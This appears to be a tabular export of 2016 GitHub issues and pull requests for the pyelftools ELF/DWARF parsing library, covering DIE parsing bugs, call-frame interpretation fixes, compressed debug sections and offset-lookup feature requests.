eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/122,185304009,MDU6SXNzdWUxODUzMDQwMDk=,122,improve support for finding various offsets,12619481,closed,FALSE,NA,NA,1,2016-10-26T05:58:00Z,2017-05-29T20:42:41Z,2017-05-29T20:42:41Z,CONTRIBUTOR,NA,"I came across this issue while reproducing the exploits in [1], which require knowing the offsets of dynamic tags, relocations, and other objects within their respective sections.

Currently, this can be done in client code using something like the following:

```
def get_tag_offset(dynamic_section, n):
    return dynamic_section.header['sh_offset'] + n * dynamic_section._tagsize
```

Tagsize is marked for internal use, but can be gotten portably using `some_elffile.structs.Elf_Dyn.sizeof()`. However, the function above is not passed an ELFFile object. I think it's reasonable for client code to want to calculate offsets in this way without having been passed an ELFFile and without abusing internal attributes. At the very least, we might as well provide this functionality without forcing users to repeatedly implement functions like the one above.

The obvious solution to me is to add virtual address and offset attributes and `get_offset` methods to `Section`, `Relocation`, etc, so that an object's offset can be easily found without having access to the section or segment that contains it. However, this requires adding stuff in a number of places, so I want to see what people think before I submit a patch which touches most of the high-level API.

[1] [How the ELF Ruined Christmas](https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico)
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/122/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/122/comments,https://api.github.com/repos/eliben/pyelftools/issues/122/events,https://github.com/eliben/pyelftools/issues/122,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/121,184790297,MDExOlB1bGxSZXF1ZXN0OTA1NzY0ODM=,121,Handle ARM relocations,8960884,closed,FALSE,NA,NA,14,2016-10-24T09:26:44Z,2018-07-16T13:22:56Z,2018-07-16T13:22:56Z,CONTRIBUTOR,NA,"This PR adds support to handle ARM's R_ARM_ABS32 relocation.
Fixes issue #86 
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/121/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/121/comments,https://api.github.com/repos/eliben/pyelftools/issues/121/events,https://github.com/eliben/pyelftools/pull/121,https://api.github.com/repos/eliben/pyelftools/pulls/121
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/120,183398196,MDU6SXNzdWUxODMzOTgxOTY=,120,Line2Addr Decoding,3437606,closed,FALSE,NA,NA,1,2016-10-17T12:05:52Z,2016-10-18T03:51:47Z,2016-10-18T03:51:47Z,NONE,NA,"Hello there can this tool do Line2Addr decoding 
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/120/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/120/comments,https://api.github.com/repos/eliben/pyelftools/issues/120/events,https://github.com/eliben/pyelftools/issues/120,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/119,182225012,MDU6SXNzdWUxODIyMjUwMTI=,119,Error dump of .bss section,7500679,closed,FALSE,NA,NA,5,2016-10-11T10:07:52Z,2016-10-15T21:14:07Z,2016-10-15T21:14:07Z,NONE,NA,"When dump `.bss` section by -x(byte) or -p(string), readelf.py will error generate content from other section.

```
zhongsiz@dinah:~/work/emittersvn> readelf.py -x .bss reloc.o.old

Hex dump of section '.bss':
  0x00000000 0066756e 63315f5f 46760066 756e6332 .func1__Fv.func2
  0x00000010 5f5f4676                            __Fv
```

In object file (gcc compile with -c), `.bss` section have no content, the offset is conjoint with next section

```
[Nr] Name              Type             Address           Offset
      Size              EntSize          Flags  Link  Info  Align
...
[ 4] .bss              NOBITS           0000000000000000  00000130
      0000000000000014  0000000000000000  WA       0     0     4
[ 5] .rodata           PROGBITS         0000000000000000  00000130
      0000000000000000  0000000000000000   A       0     0     1
```

I think the bug results from error consider the size when dump section content.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/119/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/119/comments,https://api.github.com/repos/eliben/pyelftools/issues/119/events,https://github.com/eliben/pyelftools/issues/119,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/118,179100079,MDExOlB1bGxSZXF1ZXN0ODY2NTc4NzU=,118,Check for header attribute when comparing,10117277,closed,FALSE,NA,NA,2,2016-09-25T18:19:12Z,2016-10-06T13:50:48Z,2016-10-06T13:50:48Z,CONTRIBUTOR,NA,"When checking against None it throws excepiton, while it's quite easy to prevent(and check against None seems quite obvious).
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/118/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/118/comments,https://api.github.com/repos/eliben/pyelftools/issues/118/events,https://github.com/eliben/pyelftools/pull/118,https://api.github.com/repos/eliben/pyelftools/pulls/118
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/117,176179150,MDU6SXNzdWUxNzYxNzkxNTA=,117,Exception when trying to parse .oat (ARM-32) File format:,12801920,open,FALSE,NA,NA,1,2016-09-10T13:16:13Z,2018-04-10T17:02:37Z,NA,NONE,NA,"Hello, while i've been using angr which depends on cle and cle on pyelftools i stumbled upon some weird errors regarding pyelftools.

I've tried to parse a simple .oat file which basically is normal ARM-32 elffile. Readelf parses it correctly. The following stacktrace is given:

`...
/home/andy/angr/angr-dev/cle/cle/backends/elf.pyc in __register_dyn(self, seg_readelf)
    341         Parse the dynamic section for dynamically linked objects.
    342         """"""
--> 343         for tag in seg_readelf.iter_tags():
    344             # Create a dictionary, self._dynamic, mapping DT_\* strings to their values
    345             tagstr = self.arch.translate_dynamic_tag(tag.entry.d_tag)

/home/andy/.environments/angr/lib/python2.7/site-packages/elftools/elf/dynamic.py in iter_tags(self, type)
    136         for tag in self._iter_tags(type=type):
    137             print tag
--> 138             yield DynamicTag(tag, self._get_stringtable())
    139 
    140     def _get_tag(self, n):

/home/andy/.environments/angr/lib/python2.7/site-packages/elftools/elf/dynamic.py in **init**(self, entry, stringtable)
     50         if entry.d_tag in self._HANDLED_TAGS:
     51             setattr(self, entry.d_tag[3:].lower(),
---> 52                     stringtable.get_string(self.entry.d_val))
     53 
     54     def __getitem__(self, name):

AttributeError: 'SymbolTableSection' object has no attribute 'get_string'`

Hope you can fix this issue, Greetings

[oat_test.zip](https://github.com/eliben/pyelftools/files/465424/oat_test.zip)
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/117/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/117/comments,https://api.github.com/repos/eliben/pyelftools/issues/117/events,https://github.com/eliben/pyelftools/issues/117,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/116,175669045,MDU6SXNzdWUxNzU2NjkwNDU=,116,Retrieving relative address of a variable ,3437606,closed,FALSE,NA,NA,5,2016-09-08T05:35:24Z,2019-12-04T18:51:54Z,2016-10-16T21:05:15Z,NONE,NA,"Hello There, I am trying to retrieve the relative address of a variable,  is the following offset 

|DW_AT_location    :  AttributeValue(name='DW_AT_location', form='DW_FORM_exprloc', value=[145, 100], raw_value=[145, 100], offset=157) relative from EBP register

Thanks
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/116/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/116/comments,https://api.github.com/repos/eliben/pyelftools/issues/116/events,https://github.com/eliben/pyelftools/issues/116,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/115,173745687,MDExOlB1bGxSZXF1ZXN0ODMwNzgyOTU=,115,Extend relocation patching in Relocationhandler,126646,closed,FALSE,NA,NA,6,2016-08-29T10:38:01Z,2017-04-05T13:25:55Z,2017-04-05T13:25:55Z,NONE,NA,"This adds two optional arguments to apply_section_relocations:
- symbol_mapping: The symbol mapping maps symbol ordinals to addresses. If no symbol mapping is provided, symbols are taken to be at absolute address st_value from their entry in the symbol table (as
  was the behavior before).
- section_base can be passed, which is the starting address of the section to be relocated in memory. This is used to correctly emit pc-relative relocations. If not passed this will default to 0.

These are necessary to relocate executable files with imports at a non-zero base address in memory.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/115/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/115/comments,https://api.github.com/repos/eliben/pyelftools/issues/115/events,https://github.com/eliben/pyelftools/pull/115,https://api.github.com/repos/eliben/pyelftools/pulls/115
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/114,172194856,MDU6SXNzdWUxNzIxOTQ4NTY=,114,CompileUnit._parse_DIEs() misreads DIE size in rare instances,3460958,open,FALSE,NA,NA,2,2016-08-19T18:44:22Z,2020-02-05T23:18:15Z,NA,NONE,NA,"It appears that pyelftools is having trouble correctly parsing the DIEs of all of the Go executables that I've passed it so far.

For reproduction purposes, I've uploaded the object file I was using as well as a python script and shell script that will replicate the issue. Additionally, I've uploaded both the full output from both executions, as well as a trimmed version of each that begin where the issues first appears.

https://drive.google.com/file/d/0B393V_QOoZPjUU5rbkNpV19zREU/view?usp=sharing

One of the first things you'll notice is that the pyelftools output completes long before dwarfdump does. You may also notice that the DIE at offset `0x00016ce8`, according to dwarfdump, has a size of 17 bytes, while that same DIE according to pyelftools is 23 bytes. Because pyelftools is reading the wrong number of bytes, it interprets the following DIE incorrectly, which causes the next one to be misinterpreted, and so on. This chain of events continues until it reads the ""DIE"" at offset `0x16d02` after which it stops. So not only is pyelftools misreading these DIE, but it's also not fully parsing the list. 

I'm really not sure what could be causing this. Maybe someone else has some idea?
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/114/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/114/comments,https://api.github.com/repos/eliben/pyelftools/issues/114/events,https://github.com/eliben/pyelftools/issues/114,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/113,171880133,MDU6SXNzdWUxNzE4ODAxMzM=,113,CompileUnit: Track DIEs by offset,1916566,closed,FALSE,NA,NA,9,2016-08-18T11:34:01Z,2020-04-22T00:02:09Z,2019-12-13T23:41:24Z,NONE,NA,"DIEs refer to one another by their offset in the stream.

For example, a [`DW_TAG_typedef`](http://www.dwarfstd.org/doc/DWARF4.pdf#page=96) DIE will have  ""a `DW_AT_type` attribute whose value is a reference to the type named by the typedef.""

So to get the actual type of a typedef DIE, I currently use something like this in my monkey-patched `CompileUnit` class:

``` python
import elftools.dwarf.compileunit
class MyCompileUnit(elftools.dwarf.compileunit.CompileUnit):

    def get_DIE_at_offset(self, offset):
        for die in self.iter_DIEs():
            if die.offset == offset:
                return die 
        return None

elftools.dwarf.compileunit.CompileUnit = MyCompileUnit
```

This O(n) lookup is inefficient.

Currently, `CompileUnit` [stores all of the DIEs in a simple list](https://github.com/eliben/pyelftools/blob/60319cbb9d469e8d7c56e8f85dd55294c0ce4f62/elftools/dwarf/compileunit.py#L120).

I propose instead (or also) storing them in a dictionary, using their `offset` as the key. This will be unique for all DIEs, and provide fast lookup via a new function like:

``` python
def _get_DIE_by_offset(self, offset):
    return self._diedict[offset]
```

Since the existing `_get_DIE` could be used by existing code (even though it is ""private""), it makes sense to leave the existing infrastructure in place, and maintain this offset-lookup side-by-side.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/113/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/113/comments,https://api.github.com/repos/eliben/pyelftools/issues/113/events,https://github.com/eliben/pyelftools/issues/113,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/112,171766358,MDU6SXNzdWUxNzE3NjYzNTg=,112,CompileUnit._parse_DIEs() misreads DIE size in rare instances,3460958,closed,FALSE,NA,NA,4,2016-08-17T21:35:46Z,2016-08-19T18:44:54Z,2016-08-19T18:44:54Z,NONE,NA,"```
0x0010adc0:     TAG_base_type [11]  
AT_name( ""uint32"" )
AT_encoding( DW_ATE_unsigned )
AT_byte_size( 0x04 )
Unknown DW_AT constant: 0x2900( 0x0a )

0x0010adcb:     TAG_base_type [11]  
AT_name( ""uint8"" )
AT_encoding( DW_ATE_unsigned )
AT_byte_size( 0x01 )
Unknown DW_AT constant: 0x2900( 0x08 )

0x0010add5:     TAG_pointer_type [17]  
AT_name( ""*runtime.typeAlg"" )
AT_type( {0x000000000010adf0} ( runtime.typeAlg ) )
Unknown DW_AT constant: 0x2900( 0x16 )

0x0010adf0:     TAG_structure_type [21] *
AT_name( ""runtime.typeAlg"" )
AT_byte_size( 0x00000010 )
Unknown DW_AT constant: 0x2900( 0x19 )

0x0010ae03:         TAG_member [6]  
AT_name( ""hash"" )
AT_data_member_location( +0 )
AT_type( {0x000000000010ae40} ( func(unsafe.Pointer, uintptr) uintptr ) )

0x0010ae14:         TAG_member [6]  
AT_name( ""equal"" )
AT_data_member_location( +8 )
AT_type( {0x000000000010aec6} ( func(unsafe.Pointer, unsafe.Pointer) bool ) )

0x0010ae26:         NULL

0x0010ae27:     TAG_typedef [22]  
AT_name( ""runtime.typeAlg"" )
AT_type( {0x000000000010adf0} ( runtime.typeAlg ) )
```

and the corresponding DIE output by pyelftools:

```
1093056 (0x10ADC0)
DIE DW_TAG_base_type, size=11, has_chidren=False
|DW_AT_name        :  AttributeValue(name='DW_AT_name', form='DW_FORM_string', value='uint32', raw_value='uint32', offset=1093057)
|DW_AT_encoding    :  AttributeValue(name='DW_AT_encoding', form='DW_FORM_data1', value=7, raw_value=7, offset=1093064)
|DW_AT_byte_size   :  AttributeValue(name='DW_AT_byte_size', form='DW_FORM_data1', value=4, raw_value=4, offset=1093065)
|10496             :  AttributeValue(name=10496, form='DW_FORM_data1', value=10, raw_value=10, offset=1093066)

1093067 (0x10ADCB)
DIE DW_TAG_base_type, size=10, has_chidren=False
|DW_AT_name        :  AttributeValue(name='DW_AT_name', form='DW_FORM_string', value='uint8', raw_value='uint8', offset=1093068)
|DW_AT_encoding    :  AttributeValue(name='DW_AT_encoding', form='DW_FORM_data1', value=7, raw_value=7, offset=1093074)
|DW_AT_byte_size   :  AttributeValue(name='DW_AT_byte_size', form='DW_FORM_data1', value=1, raw_value=1, offset=1093075)
|10496             :  AttributeValue(name=10496, form='DW_FORM_data1', value=8, raw_value=8, offset=1093076)

1093077 (0x10ADD5)
DIE DW_TAG_pointer_type, size=23, has_chidren=False
|DW_AT_name        :  AttributeValue(name='DW_AT_name', form='DW_FORM_string', value='*runtime.typeAlg', raw_value='*runtime.typeAlg', offset=1093078)
|DW_AT_type        :  AttributeValue(name='DW_AT_type', form='DW_FORM_ref_addr', value=1093104, raw_value=1093104, offset=1093095)
|10496             :  AttributeValue(name=10496, form='DW_FORM_data1', value=0, raw_value=0, offset=1093099)

1093100 (0x10ADEC)
DIE None, size=1, has_chidren=None

1093101 (0x10ADED)
DIE None, size=1, has_chidren=None

1093102 (0x10ADEE)
DIE None, size=1, has_chidren=None

1093103 (0x10ADEF)
DIE DW_TAG_typedef, size=22, has_chidren=False
|DW_AT_name        :  AttributeValue(name='DW_AT_name', form='DW_FORM_string', value='\x15runtime.typeAlg', raw_value='\x15runtime.typeAlg', offset=1093104)
|DW_AT_type        :  AttributeValue(name='DW_AT_type', form='DW_FORM_ref_addr', value=1745230096, raw_value=1745230096, offset=1093121)
```

Note that the size of the DIE at offset 0x10ADCB is read as 11 by dwarfdump, but 10 by pyelftools. It's also interesting to note that dwarfdump displays more information past that what I posted, whereas pyelftools stops here.

This misrepresentation of data begins with DIE 0x10ADCB, wherein pyelftools believes the next DIE starts 10 bytes later, when it really starts 11 bytes later. This misreading causes a chain of misreadings, resulting in this incorrect output.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/112/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/112/comments,https://api.github.com/repos/eliben/pyelftools/issues/112/events,https://github.com/eliben/pyelftools/issues/112,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/111,171763349,MDU6SXNzdWUxNzE3NjMzNDk=,111,CompileUnit._parse_DIEs() misreads DIE size in rare instances,3460958,closed,FALSE,NA,NA,1,2016-08-17T21:20:58Z,2016-08-17T21:36:57Z,2016-08-17T21:36:48Z,NONE,NA,"```
0x0010adc0:     TAG_base_type [11]  
AT_name( ""uint32"" )
AT_encoding( DW_ATE_unsigned )
AT_byte_size( 0x04 )
Unknown DW_AT constant: 0x2900( 0x0a )
```

0x0010adcb:     TAG_base_type [11]  
                 AT_name( ""uint8"" )
                 AT_encoding( DW_ATE_unsigned )
                 AT_byte_size( 0x01 )
                Unknown DW_AT constant: 0x2900( 0x08 )

0x0010add5:     TAG_pointer_type [17]  
                 AT_name( ""*runtime.typeAlg"" )
                 AT_type( {0x000000000010adf0} ( runtime.typeAlg ) )
                Unknown DW_AT constant: 0x2900( 0x16 )

0x0010adf0:     TAG_structure_type [21] *
                 AT_name( ""runtime.typeAlg"" )
                 AT_byte_size( 0x00000010 )
                Unknown DW_AT constant: 0x2900( 0x19 )

0x0010ae03:         TAG_member [6]  
                     AT_name( ""hash"" )
                     AT_data_member_location( +0 )
                     AT_type( {0x000000000010ae40} ( func(unsafe.Pointer, uintptr) uintptr ) )

0x0010ae14:         TAG_member [6]  
                     AT_name( ""equal"" )
                     AT_data_member_location( +8 )
                     AT_type( {0x000000000010aec6} ( func(unsafe.Pointer, unsafe.Pointer) bool ) )

0x0010ae26:         NULL

0x0010ae27:     TAG_typedef [22]  
                 AT_name( ""runtime.typeAlg"" )
                 AT_type( {0x000000000010adf0} ( runtime.typeAlg ) )
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/111/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/111/comments,https://api.github.com/repos/eliben/pyelftools/issues/111/events,https://github.com/eliben/pyelftools/issues/111,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/110,171743212,MDU6SXNzdWUxNzE3NDMyMTI=,110,Issue with CompileUnit._parseDIEs(),3460958,closed,FALSE,NA,NA,1,2016-08-17T19:43:39Z,2016-08-17T20:47:34Z,2016-08-17T20:46:14Z,NONE,NA,"Currently, the way that a CompileUnit finds all of the DIEs contained within itself is via the following code:

```
# Compute the boundary (one byte past the bounds) of this CU in the
# stream
cu_boundary = ( self.cu_offset +
            self['unit_length'] +
            self.structs.initial_length_field_size())

# First pass: parse all DIEs and place them into self._dielist
die_offset = self.cu_die_offset
while die_offset < cu_boundary:
    die = DIE(
        cu=self,
        stream=self.dwarfinfo.debug_info_sec.stream,
        offset=die_offset)
    self._dielist.append(die)
    die_offset += die.size
```

This algorithm assumes that all DIE are aligned consecutively. That is, the next DIE starts where the current one ends. And this is fine for most cases. But I've run into an executable where this assumption does NOT hold true. Instead, there's one point where there's a single byte between one DIE and the next DIE . As a result, the second DIE doesn't get parsed properly. 

Is there any way that this can be fixed? Is this even a bug, or is it definitively an issue with the executable?

Thanks!
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/110/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/110/comments,https://api.github.com/repos/eliben/pyelftools/issues/110/events,https://github.com/eliben/pyelftools/issues/110,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/109,165751161,MDExOlB1bGxSZXF1ZXN0Nzc1OTEwMjU=,109,Support SHT_NOTE sections,580564,closed,FALSE,NA,NA,4,2016-07-15T09:56:55Z,2016-08-01T11:14:35Z,2016-08-01T11:14:35Z,CONTRIBUTOR,NA,"This commit adds a new NoteSection class with an iter_notes iterator which operates in much the same way as NoteSegment's iter_notes.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/109/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/109/comments,https://api.github.com/repos/eliben/pyelftools/issues/109/events,https://github.com/eliben/pyelftools/pull/109,https://api.github.com/repos/eliben/pyelftools/pulls/109
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/108,164540673,MDExOlB1bGxSZXF1ZXN0NzY3NTk3MzE=,108,parse .debug_aranges section,5766511,closed,FALSE,NA,NA,7,2016-07-08T14:17:53Z,2016-07-14T12:00:42Z,2016-07-14T12:00:42Z,CONTRIBUTOR,NA,"parse aranges table in dwarf and provide simple interface to get a CU offset from an address
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/108/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/108/comments,https://api.github.com/repos/eliben/pyelftools/issues/108/events,https://github.com/eliben/pyelftools/pull/108,https://api.github.com/repos/eliben/pyelftools/pulls/108
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/107,163370812,MDExOlB1bGxSZXF1ZXN0NzU5NjE5NDc=,107,Fix Windows import error by getting page size using 'mmap' module if 'resource' is not available.,974874,closed,FALSE,NA,NA,2,2016-07-01T10:50:41Z,2016-07-04T12:10:31Z,2016-07-04T12:10:31Z,CONTRIBUTOR,NA,"The resource module is Unix only, changed to use mmap for Windows.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/107/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/107/comments,https://api.github.com/repos/eliben/pyelftools/issues/107/events,https://github.com/eliben/pyelftools/pull/107,https://api.github.com/repos/eliben/pyelftools/pulls/107
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/106,162331610,MDU6SXNzdWUxNjIzMzE2MTA=,106,High level functionalities,8723837,closed,FALSE,NA,NA,2,2016-06-26T15:06:06Z,2016-06-27T13:50:51Z,2016-06-27T13:50:51Z,CONTRIBUTOR,NA,"There is no high level functions to play with the DWARF symbols. You need to do everything from the original structures which is not always easy. Is this a personnal choice not to provide any or do you accept some high level pull request to enhance this ? (For example, utils to link structure declarations in code to easily access their member's values)
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/106/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/106/comments,https://api.github.com/repos/eliben/pyelftools/issues/106/events,https://github.com/eliben/pyelftools/issues/106,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/105,161125606,MDExOlB1bGxSZXF1ZXN0NzQzOTUwOTE=,105,Remove construct copy from source tree and change code to use package.,8070849,closed,FALSE,NA,NA,1,2016-06-20T06:32:45Z,2016-06-20T22:44:07Z,2016-06-20T22:44:07Z,NONE,NA,"This worked very seamlessly - other than changing imports no changes to the source code were needed. Tests pass on Python 2.7 and 3.5.

Changes in more detail:
- delete directory elftools/construct
- add construct as a dependency in setup.py
- change imports to use package
- add install command to .travis.yml
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/105/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/105/comments,https://api.github.com/repos/eliben/pyelftools/issues/105/events,https://github.com/eliben/pyelftools/pull/105,https://api.github.com/repos/eliben/pyelftools/pulls/105
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/104,161069924,MDExOlB1bGxSZXF1ZXN0NzQzNjE4ODc=,104,Fix case where struct is None,8723837,closed,FALSE,NA,NA,3,2016-06-19T12:08:43Z,2016-06-19T15:10:40Z,2016-06-19T15:10:40Z,CONTRIBUTOR,NA,"Signed-off-by: Stanislas P1kachu Lejay p1kachu@lse.epita.fr
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/104/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/104/comments,https://api.github.com/repos/eliben/pyelftools/issues/104/events,https://github.com/eliben/pyelftools/pull/104,https://api.github.com/repos/eliben/pyelftools/pulls/104
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/103,161024012,MDU6SXNzdWUxNjEwMjQwMTI=,103,Bug in interpreter of DW_CFA_remember_state,16292191,closed,FALSE,NA,NA,4,2016-06-18T13:10:53Z,2018-03-06T13:16:42Z,2018-03-06T13:16:42Z,NONE,NA,"Dear all

I believe there is a small bug in the interpreter of DW_CFA_remember_state.  The interpreter pushes the current line on a stack, but, due to sharing, subsequent bytecode instructions can modify the pushed line whenever they modify the current line.

For instance, this FDE entry:

00000088 000000000000001c 0000005c FDE cie=00000030 pc= 0000000000400980.. 00000000004009d1
  DW_CFA_advance_loc: 4 to 0000000000400984
  DW_CFA_def_cfa_offset: 24
  DW_CFA_advance_loc1: 64 to 00000000004009c4
  DW_CFA_remember_state
  DW_CFA_def_cfa_offset: 8
  DW_CFA_advance_loc: 4 to 00000000004009c8
  DW_CFA_restore_state

should generate:

00000060 000000000000001c 00000034 FDE cie=00000030 pc=0000000000400980..00000000004009d1
   LOC           CFA      ra
0000000000400980 rsp+8    c-8
0000000000400984 rsp+24   c-8
00000000004009c4 rsp+8    c-8
00000000004009c8 rsp+24   c-8

 (observe the last +24, due to remembering the line for 400984), while it results in:

00000060 000000000000001c 0000000000000034 FDE cie=00000030 pc=0000000000400980..00000000004009d1
   LOC   CFA      ra
0000000000400980 rsp+8    c-8
0000000000400984 rsp+24   c-8
00000000004009c4 rsp+8    c-8
00000000004009c8 rsp+8    c-8

The final +8 is due due the update to the current line in 4009c4.  

I believe that deep-copying the current line before pushing it on the stack + updating the pc when pulling is a simple fix (patch below).

I cannot submit you a binary to reproduce easily as the FDE entry was obtained by parsing eh_frame info via an eh_frame parser I implemented (that I will eventually contribute to pyelftools) and not by parsing debug_frames.

-francesco

```
Index: pyelftools/elftools/dwarf/callframe.py
===================================================================
--- pyelftools/elftools/dwarf/callframe.py  (original)
+++ pyelftools/elftools/dwarf/callframe.py  (working copy)
@@ -501,9 +501,11 @@
                 else:
                     cur_line.pop(instr.args[0], None)
             elif name == 'DW_CFA_remember_state':
-                line_stack.append(cur_line)
+                line_stack.append(copy.deepcopy(cur_line))
             elif name == 'DW_CFA_restore_state':
+                pc = cur_line['pc'] 
                 cur_line = line_stack.pop()
+                cur_line['pc'] = pc

         # The current line is appended to the table after all instructions
         # have ended, in any case (even if there were no instructions).
```
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/103/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/103/comments,https://api.github.com/repos/eliben/pyelftools/issues/103/events,https://github.com/eliben/pyelftools/issues/103,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/102,156403532,MDExOlB1bGxSZXF1ZXN0NzExNDY5NjM=,102,Support ZLIB compressed debug sections,172294,closed,FALSE,NA,NA,4,2016-05-24T01:52:33Z,2016-06-20T22:42:35Z,2016-06-20T22:42:35Z,CONTRIBUTOR,NA,"objcopy --compress-debug-sections uses ZLIB compression to reduce debug
sections, which can sometimes be larger than the size of the binary
itself. This change makes pyelftools consider compressed debug sections
when checking for DWARF data.

readelf tool supports other types of compressed sections
(https://github.com/facebook/binutils/blob/master/binutils/readelf.c#L12038)
but their support is outside of scope of this change.

Test plan:
  $ ./test/run_all_unittests.py
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/102/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/102/comments,https://api.github.com/repos/eliben/pyelftools/issues/102/events,https://github.com/eliben/pyelftools/pull/102,https://api.github.com/repos/eliben/pyelftools/pulls/102
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/101,156393879,MDExOlB1bGxSZXF1ZXN0NzExNDAzNjM=,101,made elf/segments.py not choke on unterminated note names,2002489,closed,FALSE,NA,NA,4,2016-05-24T00:14:16Z,2020-02-04T14:29:40Z,2020-02-04T14:29:39Z,NONE,NA,"elf/segments.py tries to parse ELF note names as CStrings. This will fail if the note name does not end in a NUL character. It turns out some binaries have note names that are not NUL-terminated. To prevent elftools from choking on such files, we detect when the name is not NUL-terminated and return all its bytes instead of trying to parse it as a CString.
",NA,TRUE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/101/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/101/comments,https://api.github.com/repos/eliben/pyelftools/issues/101/events,https://github.com/eliben/pyelftools/pull/101,https://api.github.com/repos/eliben/pyelftools/pulls/101
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/100,156326758,MDU6SXNzdWUxNTYzMjY3NTg=,100,Support compressed debug info sections.,172294,closed,FALSE,NA,NA,2,2016-05-23T17:51:35Z,2016-10-16T21:08:14Z,2016-10-16T21:08:14Z,CONTRIBUTOR,NA,"elffile.py currently assumes that all debug related sections are start with .debug\* but objcopy --compress-debug-sections renames them by adding 'z' prefix, so instead of .debug_info, the section becomes .zdebug_info.
",NA,FALSE,https://api.github.com/repos/eliben/pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/100/labels{/name},https://api.github.com/repos/eliben/pyelftools/issues/100/comments,https://api.github.com/repos/eliben/pyelftools/issues/100/events,https://github.com/eliben/pyelftools/issues/100,NA
eliben,pyelftools,https://api.github.com/repos/eliben/pyelftools/issues/99,151625438,MDU6SXNzdWUxNTE2MjU0Mzg=,99,add to support DWARF macro info,5601971,open,FALSE,NA,NA,1,2016-04-28T12:09:02Z,2016-10-16T21:08:31Z,NA,NONE,NA,"dwarf4 support MACRO info ,
could you add to support it ?
for .debug_macro  section
